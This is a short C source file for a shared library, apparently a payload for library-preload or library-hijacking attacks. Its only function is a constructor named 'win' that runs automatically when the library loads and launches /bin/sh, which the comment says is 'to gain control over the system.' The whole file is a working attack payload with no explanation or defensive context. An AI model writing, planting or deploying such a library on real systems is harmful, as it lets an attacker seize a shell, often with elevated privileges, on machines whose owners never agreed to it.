#include <stdlib.h>
#include <unistd.h>

/**
 * win - Function executed when the library is loaded.
 * It spawns a shell to gain control over the system.
 */
__attribute__((constructor))
void win(void)
{
    char *args[] = {"/bin/sh", NULL};
    execve(args[0], args, NULL);
}
